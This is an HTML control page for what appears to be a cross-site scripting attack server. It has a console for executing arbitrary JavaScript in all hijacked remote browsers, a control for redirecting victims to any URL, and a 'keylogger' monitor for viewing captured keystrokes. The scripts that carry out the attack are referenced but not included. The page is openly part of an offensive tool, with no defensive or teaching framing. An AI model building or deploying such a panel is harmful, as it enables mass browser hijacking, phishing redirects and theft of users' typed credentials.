<!DOCTYPE html>
<html>
  <head>
    <title>XSS Controller Server</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="/css/controller.css" />
  </head>
  <body>
    <div id="controller">
      <h1>XSS Controller</h1>
      <h2>Remote JavaScript Execution</h2>

      <div>
        <textarea
          id="console"
          class="form-control"
          placeholder="Enter JavaScript to run against all remote clients"
        ></textarea>
        <button class="btn btn-primary" id="evalButton">Execute</button>
      </div>

      <h2>Redirect</h2>
      <div>
        <input
          class="form-control"
          id="redirectUri"
          placeholder="URL to redirect"
        />
        <button class="btn btn-primary" id="redirectButton">Redirect</button>
      </div>

      <h1>XSS Monitor</h1>
      <div id="monitor">
        <ul id="keylogger"></ul>
      </div>

    </div>

    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2"
      crossorigin="anonymous"
    ></script>
    <script src="/socket.io/socket.io.js"></script>
    <script src="/js/controller.js"></script>
  </body>
</html>
